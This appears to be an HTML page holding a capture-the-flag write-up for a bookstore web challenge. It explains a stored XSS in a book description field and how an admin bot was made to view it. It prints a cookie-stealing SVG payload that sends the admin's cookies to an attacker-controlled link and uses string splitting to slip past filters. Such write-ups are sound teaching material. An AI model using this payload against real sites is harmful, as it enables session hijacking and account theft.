@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOFLAKY - Stealer Web Challenge Writeup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #0c0c0c;
+            color: #fff;
+            line-height: 1.6;
+        }
+
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1.5rem 2rem;
+            background: #0c0c0c;
+            border-bottom: 1px solid #2a2a2a;
+        }
+
+        .logo {
+            color: #fff;
+            text-decoration: none;
+            font-size: 1.5rem;
+            font-weight: bold;
+        }
+
+        nav ul {
+            display: flex;
+            list-style: none;
+            gap: 2rem;
+        }
+
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            transition: background-color 0.3s;
+        }
+
+        nav a:hover {
+            background-color: #7D5DE6;
+        }
+        .back-button-container {
+    max-width: 800px;
+    margin: 0 auto;
+    padding: 1rem;
+}
+
+.back-button {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: #fff;
+    background-color: #2a2a2a;
+    padding: 0.8rem;
+    border-radius: 50%;
+    text-decoration: none;
+    transition: all 0.3s ease;
+    width: 40px;
+    height: 40px;
+}
+
+.back-button:hover {
+    background-color: #7D5DE6;
+    transform: translateX(-3px);
+}
+
+.back-button svg {
+    width: 20px;
+    height: 20px;
+}
+        .writeup-container {
+            max-width: 800px;
+            margin: 4rem auto;
+            padding: 0 1rem;
+        }
+
+        .writeup-header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .writeup-header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .challenge-meta {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+        }
+
+        .category {
+            background: #7D5DE6;
+            padding: 0.3rem 0.8rem;
+            border-radius: 15px;
+        }
+
+        .diff {
+            color: #FFC600;
+            font-weight: bold;
+        }
+
+        .writeup-content {
+            background: #1a1a1a;
+            border-radius: 10px;
+            padding: 2rem;
+        }
+
+        .section {
+            margin-bottom: 2rem;
+        }
+
+        .section:last-child {
+            margin-bottom: 0;
+        }
+
+        .section h2 {
+            color: #7D5DE6;
+            margin-bottom: 1rem;
+            font-size: 1.5rem;
+        }
+
+        .flag {
+            display: inline-block;
+            background: #2a2a2a;
+            padding: 1rem;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 1.1rem;
+        }
+
+        /* VS Code-like styling for code blocks */
+        pre.code {
+            display: block;
+            background: #1E1E1E;
+            padding: 1rem;
+            border-radius: 5px;
+            font-family: 'Consolas', 'Monaco', monospace;
+            margin: 1rem 0;
+            overflow-x: auto;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border: 1px solid #333;
+        }
+        
+        .code-bar {
+            display: flex;
+            justify-content: space-between;
+            background: #252526;
+            padding: 0.5rem 1rem;
+            border-top-left-radius: 5px;
+            border-top-right-radius: 5px;
+            border-bottom: 1px solid #333;
+            font-family: 'Segoe UI', sans-serif;
+            font-size: 0.8rem;
+        }
+        
+        .code-bar .file-name {
+            color: #CCCCCC;
+        }
+        
+        .code-bar .language {
+            color: #858585;
+        }
+        
+        .code-content {
+            padding: 1rem;
+        }
+        
+        /* Syntax highlighting */
+        .keyword {
+            color: #569CD6;
+        }
+        
+        .function {
+            color: #DCDCAA;
+        }
+        
+        .variable {
+            color: #9CDCFE;
+        }
+        
+        .string {
+            color: #CE9178;
+        }
+        
+        .comment {
+            color: #6A9955;
+        }
+        
+        .operator {
+            color: #D4D4D4;
+        }
+        
+        .bracket {
+            color: #D4D4D4;
+        }
+        
+        .parameter {
+            color: #9CDCFE;
+        }
+
+        .challenge-files {
+            margin-top: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        .challenge-files h2 {
+            color: #7D5DE6;
+            font-size: 1.5rem;
+        }
+
+        .challenge-files a {
+            color: #7D5DE6;
+            text-decoration: none;
+            padding: 5px;
+            background: #333;
+            border-radius: 5px;
+            transition: background 0.3s;
+            display: inline-block;
+            margin-top: 10px;
+        }
+
+        .challenge-files a:hover {
+            background: #5e3dbf;
+        }
+        
+        code.inline {
+            display: inline;
+            padding: 0.2rem 0.4rem;
+            background: #333;
+            border-radius: 3px;
+            font-family: monospace;
+        }
+        
+        .url {
+            word-break: break-all;
+        }
+
+        @media (max-width: 768px) {
+            .writeup-container {
+                margin: 2rem auto;
+            }
+            
+            .writeup-header h1 {
+                font-size: 2rem;
+            }
+            
+            .writeup-content {
+                padding: 1.5rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <a href="index.html" class="logo">SOFLAKY</a>
+        <nav>
+            <ul>
+                <li><a href="index.html">Home</a></li>
+                <li><a href="writeups.html">Writeups</a></li>
+            </ul>
+        </nav>
+    </header>
+    <main>
+        <div class="back-button-container">
+    <a href="cyberNights1.html" class="back-button">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M19 12H5M12 19l-7-7 7-7"/>
+        </svg>
+    </a>
+</div>
+        <article class="writeup-container">
+            <header class="writeup-header">
+                <h1>Stealer Web Challenge</h1>
+                <div class="challenge-meta">
+                    <span class="category">Web</span>
+                    <span class="diff">500</span>
+                </div>
+            </header>
+            <section class="writeup-content">
+                <div class="section">
+                    <h2>Description</h2>
+                    <p>"Welcome to the Bookstore! We've recently implemented a new feature that allows sellers to add detailed descriptions to their books. Our admin bot regularly checks these descriptions for any inappropriate content or out-of-stock items."</p>
+                </div>
+
+                <div class="section">
+                    <h2>Vulnerability Overview</h2>
+                    <p>This challenge featured a classic <strong>Cross-Site Scripting (XSS)</strong> vulnerability that could be leveraged for session hijacking. The goal was to extract the admin bot's session cookie, which contained the flag.</p>
+                    
+                    <p>The vulnerability existed in the book description field, which failed to properly sanitize user input. This allowed injection of JavaScript code that would execute when the admin bot viewed the book details.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Exploitation Strategy</h2>
+                    <p>The exploitation process involved several steps to trigger the XSS and extract the admin bot's cookies:</p>
+                    
+                    <ol style="margin-left: 2rem; margin-top: 1rem;">
+                        <li>Create a seller account to gain access to book creation functionality</li>
+                        <li>Add a book with a specially crafted XSS payload in the description</li>
+                        <li>Ensure the book would be reviewed by the admin bot</li>
+                        <li>Capture the admin's session when they viewed the malicious description</li>
+                    </ol>
+                </div>
+
+                <div class="section">
+                    <h2>Step 1: Initial Reconnaissance</h2>
+                    <p>After registering for an account, I discovered the application allowed users to:</p>
+                    
+                    <ul style="margin-left: 2rem; margin-top: 1rem;">
+                        <li>Register as either buyers or sellers</li>
+                        <li>Sellers could create book listings with detailed descriptions</li>
+                        <li>Buyers could report books that were listed as in stock but actually unavailable</li>
+                        <li>An admin bot would review these reports and check the book descriptions</li>
+                    </ul>
+                    
+                    <p>This admin review process presented an opportunity to execute client-side code in the admin's browser context.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Step 2: Crafting the XSS Payload</h2>
+                    <p>I created a seller account and added a book with the following XSS payload in the description field:</p>
+                    
+                    <div class="code-container">
+                        <div class="code-bar">
+                            <span class="file-name">XSS Payload</span>
+                            <span class="language">HTML</span>
+                        </div>
+                        <pre class="code"><span class="operator">&lt;</span><span class="keyword">svg</span><span class="operator">&gt;&lt;</span><span class="keyword">animate</span> <span class="variable">onbegin</span><span class="operator">=</span><span class="string">"location='link?c='+document['coo'+'kie']"</span> <span class="variable">attributename</span><span class="operator">=</span><span class="variable">x</span><span class="operator">&gt;</span></pre>
+                    </div>
+                    
+                    <p>This payload takes advantage of the <code class="inline">onbegin</code> event handler in SVG animations, which executes when the animation starts. It sends the document's cookies to a link that I controlled.</p>
+                    
+                    <p>The payload uses string concatenation (<code class="inline">['coo'+'kie']</code>) to bypass potential simple filters that might block the direct use of "cookie".</p>
+                </div>
+
+                <div class="section">
+                    <h2>Step 3: Triggering Admin Review</h2>
+                    <p>To ensure the admin bot would view my malicious book description, I:</p>
+                    
+                    <ol style="margin-left: 2rem; margin-top: 1rem;">
+                        <li>Set the book's stock to <code class="inline">0</code> (zero) to mark it as out of stock</li>
+                        <li>Created a second account as a buyer</li>
+                        <li>Searched for my own book using the buyer account</li>
+                        <li>Reported the book as out of stock through the buyer interface</li>
+                    </ol>
+                    
+                    <p>This triggered the admin review process, where the admin bot would automatically visit the book's page to verify the report.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Step 4: Capturing the Flag</h2>
+                    <p>When the admin bot visited the book description page, the SVG animation triggered and executed my JavaScript payload, which sent the admin's cookies to my controlled endpoint.</p>
+                    
+                    <p>The request received contained the admin's session cookie, which included the flag. The payload effectively exfiltrated the sensitive information without requiring any further interaction.</p>
+                </div>
+
+                <div class="section">
+                    <h2>Flag</h2>
+                    <code class="flag">FlagY{******}</code>
+                </div>
+            </section>
+        </article>
+    </main>
+</body>
+</html>
